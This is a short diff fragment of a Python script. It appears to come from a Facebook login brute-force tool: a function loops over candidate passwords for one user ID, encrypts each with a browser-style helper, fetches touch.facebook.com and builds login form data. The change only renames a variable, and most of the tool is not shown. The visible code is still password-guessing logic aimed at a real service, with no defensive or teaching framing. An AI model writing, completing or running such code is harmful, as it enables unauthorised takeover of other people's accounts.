@@ -1267,8 +1267,9 @@ def mbasic(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
+            password = pw
             web_encryptor = Encrypt_PWD_Web()
-            web_token = web_encryptor.PWD_BROWSER(pw)
+            web_token = web_encryptor.PWD_BROWSER(password)
             free_fb = Session.get('https://touch.facebook.com').text
             data = {
             "m_ts": "1758859976",
